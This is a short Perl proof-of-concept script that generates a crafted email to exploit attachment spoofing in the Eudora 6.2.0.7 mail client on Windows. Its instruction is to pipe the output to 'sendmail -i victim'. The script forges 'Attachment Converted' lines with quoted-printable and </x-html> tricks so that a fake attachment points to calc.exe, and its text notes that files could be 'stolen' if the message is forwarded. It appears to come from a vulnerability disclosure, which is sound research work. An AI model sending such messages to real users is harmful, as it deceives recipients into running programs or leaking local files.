#!/usr/bin/perl --

use MIME::Base64;

print "From: me\n";
print "To: you\n";
print "Subject: Eudora 6.2.0.7 on Windows spoof\n";
print "MIME-Version: 1.0\n";
print "Content-Type: multipart/mixed; boundary=\"zzz\"\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";

print "--zzz\n";
print "Content-Type: text/plain\n";
print "Content-Transfer-Encoding: 7bit\n\n";
print "With spoofed attachments, we could 'steal' files (after a warning?)
if the message was forwarded (not replied to).\n";

print "\n--zzz\n";
print "Content-Type: text/html; name=\"qp.txt\"\n";
print "Content-Transfer-Encoding: quoted-printable \n";
print "Content-Disposition: inline; filename=\"qp.txt\"\n\n";
print "Within text/html part, use &lt;/x-html&gt; to get back to plaintext,
no need for NUL or linebreak or nothing:
</x-html>\n";
print "Attachment Converted=00: \"c:\\winnt\\system32\\calc.exe\"\n";
print "Attachment Converted=
: \"c:\\winnt\\system32\\calc.exe\"\n";
print "Attachment Converted: \"c:\\winnt\\system32\\calc.exe\"\n";

print "\n--zzz--\n";
